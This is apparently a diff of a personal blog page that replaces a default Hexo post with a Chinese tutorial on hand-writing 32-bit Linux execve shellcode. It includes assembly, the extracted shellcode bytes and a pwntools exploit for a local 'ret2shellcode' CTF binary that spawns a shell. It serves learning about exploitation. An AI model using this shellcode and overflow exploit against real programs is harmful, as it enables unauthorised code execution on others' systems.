@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="PWN," />
 
 
 
@@ -86,17 +86,18 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="description" content="Preface之前一直对shellcode的编写一知半解，不知所以。这就好好学习一下shellcode的编写。">
+<meta name="keywords" content="PWN">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://mrhong.me/2018/05/10/hello-world/index.html">
+<meta property="og:title" content="shellcode">
+<meta property="og:url" content="http://mrhong.me/2018/05/11/shellcode/index.html">
 <meta property="og:site_name" content="mrhong">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="Preface之前一直对shellcode的编写一知半解，不知所以。这就好好学习一下shellcode的编写。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-05-10T02:51:03.223Z">
+<meta property="og:updated_time" content="2018-05-11T13:47:43.118Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="shellcode">
+<meta name="twitter:description" content="Preface之前一直对shellcode的编写一知半解，不知所以。这就好好学习一下shellcode的编写。">
 
 
 
@@ -126,7 +127,7 @@
 
 
 
-  <link rel="canonical" href="http://mrhong.me/2018/05/10/hello-world/"/>
+  <link rel="canonical" href="http://mrhong.me/2018/05/11/shellcode/"/>
 
 
 
@@ -139,7 +140,7 @@
 
 
 
-  <title>Hello World | mrhong</title>
+  <title>shellcode | mrhong</title>
   
 
 
@@ -300,7 +301,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://mrhong.me/2018/05/10/hello-world/">
+    <link itemprop="mainEntityOfPage" href="http://mrhong.me/2018/05/11/shellcode/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="mrhong">
@@ -317,7 +318,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Hello World</h1>
+          <h1 class="post-title" itemprop="name headline">shellcode</h1>
         
 
         <div class="post-meta">
@@ -329,8 +330,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-10T10:51:03+08:00">
-                2018-05-10
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-11T20:00:04+08:00">
+                2018-05-11
               </time>
             
 
@@ -367,15 +368,44 @@
       
 
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>之前一直对shellcode的编写一知半解，不知所以。这就好好学习一下shellcode的编写。</p>
+<a id="more"></a>
+<p>shellcode是一组可注入的指令，可以在被攻击的程序中运行。由于shellcode要直接操作寄存器和函数，所以必须是十六进制的形式。<br>那么为什么要写shellcode呢？因为我们要让目标程序以不同于设计者预期的方式运行，而操作的程序的方法之一就是强制它产生系统调用（system,call,syscall)。通过系统调用，你可以直接访问系统内核，成功attack。<br>在Linux里有两个方法来执行系统调用:</p>
+<blockquote>
+<p>间接方法: c函数包装（libc）</p>
+<p>直接方法: 用汇编指令（通过把适当的参数加载到寄存器，然后调用int 0x80软中断）</p>
+</blockquote>
+<p>这里主要学习一下直接方法，借用系统调用execve，关于其他的exec关联函数组下次好好复习一下</p>
+<h2 id="Execve"><a href="#Execve" class="headerlink" title="Execve"></a>Execve</h2><p>头文件：<code>#include &lt;unistd.h&gt;</code></p>
+<p>定义函数：<code>int execve(const char * filename, char * const argv[], char * const envp[]);</code></p>
+<p>函数说明：</p>
+<blockquote>
+<p>filename必须是一个二进制的可执行文件，或者是一个脚本以#！格式开头的解释器参数参数。如果是后者，这个解释器必须是一个可执行的有效的路径名，但是不是脚本本身，它将调用解释器作为文件名。</p>
+<p>argv 是要调用的程序执行的参数序列，也就是我们要调用的程序需要传入的参数。</p>
+<p>envp 也是参数序列，一般来说他是一种键值对的形式 key=value. 作为我们给执行文件的新环境变量数组</p>
+<p>返回值：如果执行成功则函数不会返回, 执行失败则直接返回-1, 失败原因存于errno 中.</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> * argv[] = &#123;<span class="string">"ls"</span>, <span class="string">"-l"</span>, <span class="string">"/tmp"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> * envp[] = &#123;<span class="string">"PATH=/bin"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    execve(<span class="string">"/bin/ls"</span>, argv, envp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//功能相当于 ls -l</span></span><br></pre></td></tr></table></figure>
+<h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><blockquote>
+<p>Linux系统调用是以int 0x80指令来陷入内核态的，系统调用号通过eax来传递，参数分别是ebx, ecx, edx, edi, esi来传递。</p>
+</blockquote>
+<p>###编写汇编源码</p>
+<p>先来看看execve的系统调用号是<code>0x0b</code>,可以在<a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">syscall_kernelgrok</a>中查询</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> * argv[] = &#123;<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> * envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">"/bin/sh"</span>, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述程序可以获取并返回shell</p>
+<p>开始手动写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">push ecx     ;//压入字符串结束符</span><br><span class="line">push &quot;//sh&quot;</span><br><span class="line">push &quot;/bin&quot;  ;//入栈</span><br><span class="line">mov ebx,esp ;//将栈内字符串地址赋给ebx，即系统调用的第一个参数</span><br><span class="line"></span><br><span class="line">push edx     ;// argv[1]入栈</span><br><span class="line">push ebx     ;// argv[0]入栈</span><br><span class="line">mov ecx,esp ;// 将argv地址赋给exc,即系统调用的第二个参数</span><br><span class="line"></span><br><span class="line">push edx     ;//系统调用的第三个参数</span><br><span class="line"></span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0Bh   ;//execve系统调用号</span><br><span class="line">int 80h      ;//软中断指令</span><br><span class="line">;//保存为shell.asm</span><br></pre></td></tr></table></figure>
+<p>编译生成 shell.o后链接并测试</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@<span class="built_in">test</span>-vm-x86:~/Desktop/system$ nasm -f elf32 shell.asm</span><br><span class="line"><span class="built_in">test</span>@<span class="built_in">test</span>-vm-x86:~/Desktop/system$ ld -m elf_i386 -o shell  shell.o</span><br><span class="line"><span class="built_in">test</span>@<span class="built_in">test</span>-vm-x86:~/Desktop/system$ ./shell </span><br><span class="line">$ ls</span><br><span class="line">shell  shell.asm  shell.asm~  shell.o</span><br></pre></td></tr></table></figure>
+<p>shellcode执行后，可以起一个新的shell.</p>
+<h3 id="提取shellcode"><a href="#提取shellcode" class="headerlink" title="提取shellcode"></a>提取shellcode</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@<span class="built_in">test</span>-vm-x86:~/Desktop/system$ objdump -d shell</span><br><span class="line"></span><br><span class="line">shell:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:	31 c9                	xor    %ecx,%ecx</span><br><span class="line"> 8048062:	31 d2                	xor    %edx,%edx</span><br><span class="line"> 8048064:	51                   	push   %ecx</span><br><span class="line"> 8048065:	68 2f 2f 73 68       	push   <span class="variable">$0x68732f2f</span></span><br><span class="line"> 804806a:	68 2f 62 69 6e       	push   <span class="variable">$0x6e69622f</span></span><br><span class="line"> 804806f:	89 e3                	mov    %esp,%ebx</span><br><span class="line"> 8048071:	52                   	push   %edx</span><br><span class="line"> 8048072:	53                   	push   %ebx</span><br><span class="line"> 8048073:	89 e1                	mov    %esp,%ecx</span><br><span class="line"> 8048075:	52                   	push   %edx</span><br><span class="line"> 8048076:	31 c0                	xor    %eax,%eax</span><br><span class="line"> 8048078:	b0 0b                	mov    <span class="variable">$0xb</span>,%al</span><br><span class="line"> 804807a:	<span class="built_in">cd</span> 80                	int    <span class="variable">$0x80</span></span><br></pre></td></tr></table></figure>
+<p>提取shellcode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &quot;\x31\xc9\x31\xd2\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x52\x31\xc0\xb0\x0b\xcd\x80&quot;</span><br></pre></td></tr></table></figure>
+<p>##Example</p>
+<p>这里我们以bamboofox中的ret2shellcode为例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exploit.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">shellcode = <span class="string">"\x31\xc9\x31\xd2\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x52\x31\xc0\xb0\x0b\xcd\x80"</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">'A'</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@<span class="built_in">test</span>-vm-x86:~/Desktop/pwn/stackoverflow/ret2shellcode$ python exploit.py </span><br><span class="line">[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./ret2shellcode'</span>: pid 6983</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">No system <span class="keyword">for</span> you this time !!!</span><br><span class="line"><span class="built_in">bye</span> <span class="built_in">bye</span> ~$ ls</span><br><span class="line">exploit.py  exploit.py~  ret2shellcode    ret2shellcode.c  ret2shellcode.idb</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+<p>就写到这把  下次再补充</p>
 
       
     </div>
@@ -390,6 +420,12 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PWN/" rel="tag"><i class="fa fa-tag"></i> PWN</a>
+          
+        </div>
       
 
       
@@ -514,7 +550,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
@@ -581,7 +617,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-number">1.</span> <span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-number">1.1.</span> <span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-number">1.2.</span> <span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-number">1.3.</span> <span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-number">1.4.</span> <span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Preface"><span class="nav-number">1.</span> <span class="nav-text">Preface</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Execve"><span class="nav-number">2.</span> <span class="nav-text">Execve</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shellcode"><span class="nav-number">3.</span> <span class="nav-text">Shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#提取shellcode"><span class="nav-number">3.1.</span> <span class="nav-text">提取shellcode</span></a></li></ol></li></ol></div>
             
 
           </div>
